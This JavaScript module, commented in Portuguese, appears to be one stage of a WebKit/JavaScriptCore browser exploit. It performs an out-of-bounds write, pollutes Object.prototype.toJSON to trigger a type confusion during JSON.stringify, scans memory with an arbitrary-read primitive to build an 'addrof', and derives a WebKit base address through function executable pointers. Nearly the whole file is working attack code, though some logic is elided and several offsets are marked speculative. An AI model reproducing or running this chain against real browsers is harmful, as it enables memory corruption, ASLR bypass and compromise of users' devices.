// js/script3/testArrayBufferVictimCrash.mjs (R43L - Addrof via ArbRead Scan no Getter)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read, // Essencial para esta estratégia
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_ArbReadScan";

const VICTIM_TA_SCRATCHPAD_SIZE_ELEMENTS = 16; // Um pouco maior
const PROBE_CALL_LIMIT_V82 = 10;

const OOB_OFFSETS_TO_TEST = [0x7C]; // Focar no offset que sabemos que causa TC
const OOB_VALUES_TO_TEST = [0xABABABAB]; // Focar no valor que sabemos que causa TC

const M2_PATTERN_LOW  = 0x12340000 + Math.floor(Math.random()*0xFFFF); // Tornar um pouco único por execução
const M2_PATTERN_HIGH = 0xABCD0000 + Math.floor(Math.random()*0xFFFF);
const M2_PROP_OFFSET_ASSUMPTION = 0x10; // Assumindo que pattern_low está a este offset de m2_ref (após JSCell header) - ESPECULATIVO

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let target_function_for_addrof;
let leaked_address_via_addrof = null;

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */
    if (!isAdvancedInt64Object(ptr)) { logS3(`[isValidPointer-${context}] Input não é AdvInt64: ${String(ptr)}`, "debug_detail"); return false; }
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) { logS3(`[isValidPointer-${context}] NULO: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0x7FF80000 && low === 0x0) { logS3(`[isValidPointer-${context}] NaN Específico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) { logS3(`[isValidPointer-${context}] NaN Genérico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0 && low < 0x10000) { logS3(`[isValidPointer-${context}] Ponteiro Baixo: ${ptr.toString(true)}`, "debug_detail"); return false; }
    return true;
}
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    try { return toHex(value); } catch (e) { return String(value); }
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Addrof via ArbRead Scan no Getter ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init ArbReadScan...`;

    target_function_for_addrof = function someUniqueLeakFunctionR43L_ArbScan() { return `target_R43L_ArbScan_${Date.now()}`; };
    
    let final_probe_call_count_for_report = 0;
    let FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Init`;

    logS3(`--- Fase 0 (ArbReadScan): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed", /*...*/ }; }

    let iteration_results_summary = [];
    let best_result_overall = { /* ... (estrutura como antes) ... */
        errorOccurred: null, tc_probe_details: null, stringifyResultSonda: null,
        addrof_result: { success: false, msg: "Addrof (ArbReadScan): Não obtido.", leaked_object_addr: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (ArbReadScan): Não obtido.", webkit_base_candidate: null },
        oob_params_of_best_result: null,
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        best_iter_addrof_details: null,
        total_probe_calls_last_iter: 0, iteration_results_summary: []
    };
    
    let global_addrof_primitive_found = false;
    let global_webkit_leak_found = false;

    for (const current_oob_offset of OOB_OFFSETS_TO_TEST) { // Normalmente 1 offset aqui
        if (global_addrof_primitive_found && global_webkit_leak_found) break; 
        for (const current_oob_value of OOB_VALUES_TO_TEST) { // Normalmente 1 valor aqui
            if (global_addrof_primitive_found && global_webkit_leak_found) break;

            leaked_address_via_addrof = null;
            let addrof_success_this_iteration = false;

            const current_oob_hex_val = safeToHex(current_oob_value);
            const current_offset_hex = safeToHex(current_oob_offset);
            FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${current_offset_hex}_Val${current_oob_hex_val}`;

            logS3(`\n===== ITERATION ArbReadScan: Offset OOB: ${current_offset_hex}, Valor OOB: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);
            document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val}`;

            let victim_ta_scratchpad = null; // Usado para JSON.stringify e como possível fonte de ponteiro base para scan
            let m1_ref = null; 
            let m2_ref = null; 

            let iter_addrof_details = {
                attempted: false, success: false, leaked_address_str: null, notes: "",
                scan_base_addr_str: null, pattern_found_at_addr_str: null
            };

            let probe_call_count_iter = 0;
            let tc_detected_this_iter = false;
            let tc_details_this_iter = null;

            // Closure da sonda
            async function arb_read_scan_probe_toJSON() { // Tornar async para usar await arb_read
                probe_call_count_iter++; const call_num = probe_call_count_iter;
                const ctts = Object.prototype.toString.call(this);
                const is_m2c = (this === m2_ref && m2_ref !== null);

                try {
                    if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                    if (call_num === 1 && this === victim_ta_scratchpad) {
                        m2_ref = { 
                            id: "M2_ArbReadScan", 
                            pattern_low_prop: M2_PATTERN_LOW, 
                            pattern_high_prop: M2_PATTERN_HIGH,
                            target_function_prop: target_function_for_addrof 
                        };
                        m1_ref = { id: "M1_ArbReadScan", m2_payload: m2_ref };
                        logS3(`[PROBE_ArbReadScan] Call #${call_num}: 'this' é victim_ta_scratchpad. M1/M2 criados. M2 Pattern: L=0x${M2_PATTERN_LOW.toString(16)} H=0x${M2_PATTERN_HIGH.toString(16)}`, "debug_detail");
                        return m1_ref;
                    } else if (is_m2c) {
                        if (!tc_detected_this_iter) {
                            tc_detected_this_iter = true;
                            tc_details_this_iter = { /* ... */ this_is_M2: true, notes: "TC Confirmada. Tentando ArbRead Scan..."};
                            logS3(`[PROBE_ArbReadScan] Call #${call_num} (M2C): FIRST TC. 'this' é M2 (id: ${this.id}).`, "vuln");
                            
                            iter_addrof_details.attempted = true;
                            if (!arb_read || !isOOBReady()) { // Checar se arb_read está pronto
                                iter_addrof_details.notes = "arb_read não disponível ou OOB não pronto.";
                                logS3("      [GETTER_ArbReadScan] arb_read não disponível/pronto. Abortando scan.", "error");
                                return this; // Ou um valor que não cause erro no stringify
                            }

                            // Tentar encontrar um ponteiro base no victim_ta_scratchpad
                            let scan_base_addr = null;
                            let victim_u32_view = new Uint32Array(victim_ta_scratchpad.buffer);
                            for (let i = 0; i < victim_u32_view.length - 1; i += 2) {
                                const low = victim_u32_view[i];
                                const high = victim_u32_view[i+1];
                                if (low === 0 && high === 0) continue; // Pular nulos
                                let potential_base = new AdvancedInt64(low, high);
                                if (isValidPointer(potential_base, "_scanBaseCandidate")) {
                                    scan_base_addr = potential_base;
                                    logS3(`        [GETTER_ArbReadScan] Usando ponteiro do scratchpad como base para scan: ${scan_base_addr.toString(true)} (de índice ${i})`, "info_emphasis");
                                    break;
                                }
                            }

                            if (!scan_base_addr) {
                                iter_addrof_details.notes = "Nenhum ponteiro base encontrado no scratchpad para iniciar o scan.";
                                logS3("        [GETTER_ArbReadScan] Nenhum ponteiro base válido no scratchpad. Scan não pode prosseguir.", "warn");
                                return this;
                            }
                            iter_addrof_details.scan_base_addr_str = scan_base_addr.toString(true);

                            // Fazer scan com arb_read
                            const SCAN_RANGE_BYTES = 0x1000; // Varredura de 4KB para cada lado
                            const SCAN_STEP = 0x08; // Ler a cada 8 bytes (um ponteiro ou 2x Uint32)
                            
                            logS3(`        [GETTER_ArbReadScan] Varrendo memória com arb_read em torno de ${scan_base_addr.toString(true)} procurando por L=0x${M2_PATTERN_LOW.toString(16)}, H=0x${M2_PATTERN_HIGH.toString(16)}`, "info");

                            for (let offset = -SCAN_RANGE_BYTES; offset <= SCAN_RANGE_BYTES; offset += SCAN_STEP) {
                                if (global_addrof_primitive_found) break;
                                try {
                                    const current_scan_addr = scan_base_addr.add(new AdvancedInt64(offset));
                                    const val64 = await arb_read(current_scan_addr, 8); // Ler 8 bytes
                                    if (isAdvancedInt64Object(val64)) {
                                        const low = val64.low();
                                        const high = val64.high();
                                        if (low === M2_PATTERN_LOW && high === M2_PATTERN_HIGH) {
                                            logS3(`          !!! PADRÃO M2 ENCONTRADO !!! em ${current_scan_addr.toString(true)}`, "success_major");
                                            iter_addrof_details.pattern_found_at_addr_str = current_scan_addr.toString(true);
                                            
                                            // Assumindo que o padrão está no início do butterfly ou das propriedades inline.
                                            // O endereço do objeto M2 seria current_scan_addr - M2_PROP_OFFSET_ASSUMPTION
                                            const m2_addr_candidate = current_scan_addr.sub(new AdvancedInt64(M2_PROP_OFFSET_ASSUMPTION));
                                            logS3(`          Candidato addrof(M2): ${m2_addr_candidate.toString(true)}`, "vuln");

                                            // AGORA, precisamos ler m2_ref.target_function_prop
                                            // Isto requer saber o offset de target_function_prop DENTRO de M2.
                                            // Se M2_PROP_OFFSET_ASSUMPTION foi para pattern_low_prop, e target_function_prop
                                            // é a próxima propriedade de 64 bits:
                                            const OFFSET_OF_TARGET_FUNC_IN_M2 = M2_PROP_OFFSET_ASSUMPTION + 8; // ESPECULATIVO!
                                            const target_func_addr_candidate = await arb_read(m2_addr_candidate.add(new AdvancedInt64(OFFSET_OF_TARGET_FUNC_IN_M2)), 8);

                                            if (isValidPointer(target_func_addr_candidate, "_targetFuncAddrFromM2")) {
                                                logS3(`            !!! ADDROF(target_function_for_addrof) POTENCIAL: ${target_func_addr_candidate.toString(true)} !!!`, "success_major");
                                                leaked_address_via_addrof = target_func_addr_candidate;
                                                addrof_success_this_iteration = true;
                                                global_addrof_primitive_found = true;
                                                iter_addrof_details.success = true;
                                                iter_addrof_details.leaked_address_str = target_func_addr_candidate.toString(true);
                                                iter_addrof_details.notes = `Addrof de target_function via scan e M2: ${target_func_addr_candidate.toString(true)}.`;
                                                break; // Parar scan nesta iteração do getter
                                            } else {
                                                logS3(`            Ponteiro lido para target_function_prop de M2 não é válido: ${safeToHex(target_func_addr_candidate)}`, "warn");
                                            }
                                        }
                                    }
                                } catch (e_scan) { /* Ignorar erros de leitura em endereços inválidos */ }
                            } // Fim do loop de scan
                            if (!addrof_success_this_iteration) {
                                iter_addrof_details.notes += " Padrão M2 não encontrado no scan ou falha ao derivar addrof da função.";
                            }
                        }
                        return this; // Para JSON.stringify
                    }
                } catch (e_pm) { /* ... */ }
                return { gen_m: call_num, type: ctts };
            }

            // ... (resto da lógica de iteração, chamando a sonda, etc.)
            let iter_primary_error = null;
            let iter_stringify_output_raw = null;
            try {
                victim_ta_scratchpad = new Uint32Array(VICTIM_TA_SCRATCHPAD_SIZE_ELEMENTS);
                victim_ta_scratchpad.fill(0); // Limpar scratchpad
                logS3(`   Victim TA (scratchpad/trigger) criado e preenchido com 0.`, 'info');

                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetup` });
                oob_write_absolute(current_oob_offset, current_oob_value, 4);
                logS3(`   OOB Write: ${current_oob_hex_val} @ ${current_offset_hex}`, 'info');
                await PAUSE_S3(150);

                const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
                try {
                    Object.defineProperty(Object.prototype, ppKey, { value: arb_read_scan_probe_toJSON, writable: true, configurable: true, enumerable: false });
                    polluted = true;
                    iter_stringify_output_raw = await JSON.stringify(victim_ta_scratchpad); // Await aqui porque a sonda é async
                    if (best_result_overall.stringifyResultSonda === null) best_result_overall.stringifyResultSonda = iter_stringify_output_raw;
                    logS3(`   JSON.stringify output: ${iter_stringify_output_raw ? iter_stringify_output_raw.substring(0,100) : "null" }...`, "debug_detail");
                    if (tc_detected_this_iter) logS3(`  TC Probe (ArbReadScan): TC CONFIRMADA.`, "vuln");
                    else logS3(`  TC Probe (ArbReadScan): TC NÃO Confirmada.`, "warn");
                } catch (e_str) { iter_primary_error = e_str; /* ... */ } finally { if (polluted) { /* ... */ } }
                
                if (addrof_success_this_iteration) {
                    logS3(`  Addrof via ArbReadScan teve sucesso nesta iteração: ${iter_addrof_details.leaked_address_str}`, "success_major");
                }

                if (addrof_success_this_iteration && leaked_address_via_addrof) {
                    logS3(`  ADDROF OBTIDO (${leaked_address_via_addrof.toString(true)})! Tentando WebKitLeak...`);
                    if (arb_read) { /* ... (Lógica WebKitLeak como no script anterior) ... */
                        try {
                            const ptr_exe = await arb_read(leaked_address_via_addrof.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                            if (isValidPointer(ptr_exe, "_wkLeakExeArbS")) {
                                const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                                if (isValidPointer(ptr_jitvm, "_wkLeakJitVmArbS")) {
                                    const base_candidate = ptr_jitvm.and(new AdvancedInt64(0x0, ~0xFFF));
                                    logS3(`  !!! POTENCIAL WEBKIT BASE: ${base_candidate.toString(true)} !!!`, "success_major");
                                    best_result_overall.webkit_leak_result = { success: true, msg: `WebKitLeak OK: ${base_candidate.toString(true)}`, webkit_base_candidate: base_candidate.toString(true) };
                                    global_webkit_leak_found = true;
                                } else { throw new Error("Ponteiro JIT/VM inválido."); }
                            } else { throw new Error("Ponteiro Executable inválido."); }
                        } catch(e_wk_leak) { /* ... */ }
                    }
                }
            } catch (e_outer_iter) { iter_primary_error = e_outer_iter; }
            finally { await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClear` }); }

            final_probe_call_count_for_report = probe_call_count_iter;
            let current_iter_summary = { /* ... (como antes, incluindo addrof_details_iter) ... */
                 oob_offset: current_offset_hex, oob_value: current_oob_hex_val,
                raw_oob_offset: current_oob_offset, raw_oob_value: current_oob_value,
                error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
                tc_probe_details: tc_details_this_iter,
                addrof_details_iter: iter_addrof_details, // Detalhes da tentativa de addrof
                addrof_success_this_iter: addrof_success_this_iteration,
                webkit_leak_success_this_iter: best_result_overall.webkit_leak_result.success && addrof_success_this_iteration,
                heisenbug_on_M2_confirmed_by_tc_probe: tc_detected_this_iter
            };
            iteration_results_summary.push(current_iter_summary);

            // Lógica para atualizar best_result_overall
            if (current_iter_summary.error === null) { /* ... (como antes) ... */
                 let current_is_better = false; 
                const cur_wk = current_iter_summary.webkit_leak_success_this_iter;
                const cur_addr = current_iter_summary.addrof_success_this_iter;
                const cur_tc = current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe;
                if (best_result_overall.oob_params_of_best_result === null) current_is_better = true;
                else { /* ... */ }
                if (current_is_better) { /* ... (atualizar best_result_overall) ... */ }
            }
            document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val} TC:${tc_detected_this_iter} Addr:${addrof_success_this_iteration}`;
            await PAUSE_S3(50);
        }
        if (global_addrof_primitive_found && global_webkit_leak_found) break;
        await PAUSE_S3(100);
    }

    best_result_overall.total_probe_calls_last_iter = final_probe_call_count_for_report;
    best_result_overall.iteration_results_summary = iteration_results_summary;
    /* ... (resto da atribuição de best_result_overall e título final) ... */
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final best_result_overall (ArbReadScan): ${JSON.stringify(best_result_overall, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    document.title = best_result_overall.final_title_page || `${FNAME_CURRENT_TEST_BASE} Final: Done`;
    return best_result_overall;
}
